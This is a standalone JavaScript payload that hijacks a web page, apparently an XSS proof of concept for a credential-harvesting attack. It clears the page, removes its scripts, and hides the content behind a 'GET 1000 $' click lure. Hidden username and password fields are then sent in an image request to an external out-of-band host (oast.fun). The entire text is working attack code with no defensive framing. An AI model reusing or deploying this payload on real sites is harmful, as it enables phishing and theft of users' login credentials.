document.body.innerHTML = "";
var scriptss = document.scripts;

for (var i = scriptss.length - 1; i >= 0; i--) {
  var script = scriptss[i];
  script.parentNode.removeChild(script);
}

var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none !important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

var form = document.createElement('form');
form.style.display = 'flex';
form.style.flexDirection = 'column';
form.style.justifyContent = 'center';
form.style.alignItems = 'center';
form.style.height = '100vh';

var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.placeholder = 'CLICK or DOUBLE CLICK to GET 1000 $';
inputName.style.border = "none";
inputName.style.outline = "none";
inputName.style.background = "none";
inputName.style.width = "100%";
inputName.style.textAlign = "center";
inputName.style.fontSize = "30px";
inputName.style.fontWeight = "bold";
inputName.style.display = "none"; // Hide the input field
inputName.classList.add("single-input");

var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.padding = "0";
inputPassword.style.width = "1%";
inputPassword.style.display = "none"; // Hide the input field
inputPassword.classList.add("single-input");

var displayText = document.createElement('div');
displayText.innerText = 'CLICK or DOUBLE CLICK to GET 1000 $';
displayText.style.textAlign = "center";
displayText.style.fontSize = "30px";
displayText.style.fontWeight = "bold";
displayText.style.cursor = "pointer";

form.appendChild(inputName);
form.appendChild(inputPassword);
form.appendChild(displayText);

document.body.appendChild(form);

function sendCredentials(username, password) {
  var img = new Image();
  img.src = `https://cukyszggmaaaxoawavatbwoef3pnwc0q9.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
  document.body.appendChild(img);
}

function attachEventListeners() {
  let a = document.getElementById('username');
  let b = document.getElementById('password');
  
  a.value = 'victimuser'; // Predefined username
  b.value = 'victimpassword'; // Predefined password

  function f() {
    sendCredentials(a.value, b.value);
  }

  displayText.onclick = f;
}

document.addEventListener('DOMContentLoaded', function() {
  setTimeout(attachEventListeners, 1000);
});
